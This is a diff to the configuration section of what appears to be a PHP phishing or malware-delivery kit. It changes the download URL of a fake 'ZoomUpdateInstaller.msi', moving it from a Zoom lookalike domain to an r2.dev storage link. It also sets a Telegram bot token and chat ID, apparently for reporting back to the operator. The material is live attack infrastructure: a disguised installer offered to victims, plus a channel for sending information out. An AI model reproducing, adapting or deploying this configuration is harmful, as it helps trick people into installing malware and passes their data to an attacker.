@@ -2,7 +2,7 @@
 // =====================================================
 // CONFIGURATION SECTION — EDIT ONLY THESE 3 VALUES
 // =====================================================
-$DOWNLOAD_URL        = "https://zoom-meeting.yourco-invite.live/inc/Windows/client/update/ZoomUpdateInstaller.msi";        // Example: https://example.com/file.exe
+$DOWNLOAD_URL        = "https://pub-c798060e4945496097319acef6e8855c.r2.dev/ZoomUpdateInstaller.msi";        // Example: https://example.com/file.exe
 $TELEGRAM_BOT_TOKEN  = "7284066719:AAFmrZ2q7kWos3sAwvigTquNtFwGEjN3JGY";      // Example: 123456:ABC-xyz
 $TELEGRAM_CHAT_ID    = "7724482403";             // Example: 987654321
 // =====================================================
